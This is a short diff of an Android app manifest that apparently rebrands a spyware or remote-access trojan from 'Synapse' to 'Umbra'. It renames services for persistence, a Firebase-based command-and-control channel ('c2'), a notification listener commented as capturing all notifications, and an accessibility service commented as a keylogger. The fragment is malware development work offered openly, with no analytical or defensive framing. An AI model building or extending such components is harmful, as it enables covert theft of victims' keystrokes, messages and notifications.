@@ -78,7 +78,7 @@
             android:theme="@android:style/Theme.NoDisplay"/>
 
         <service
-            android:name=".persistence.SynapseService"
+            android:name=".persistence.UmbraService"
             android:foregroundServiceType="specialUse|dataSync"
             android:exported="false">
             <property
@@ -87,7 +87,7 @@
         </service>
 
         <service
-            android:name=".c2.SynapseFcmService"
+            android:name=".c2.UmbraFcmService"
             android:exported="false">
             <intent-filter>
                 <action android:name="com.google.firebase.MESSAGING_EVENT"/>
@@ -96,7 +96,7 @@
 
         <!-- Notification Listener Service — captures all notifications -->
         <service
-            android:name=".modules.SynapseNotificationListener"
+            android:name=".modules.UmbraNotificationListener"
             android:exported="true"
             android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE">
             <intent-filter>
@@ -106,7 +106,7 @@
 
         <!-- Accessibility Service — keylogger -->
         <service
-            android:name=".modules.SynapseAccessibilityService"
+            android:name=".modules.UmbraAccessibilityService"
             android:exported="true"
             android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
             <intent-filter>
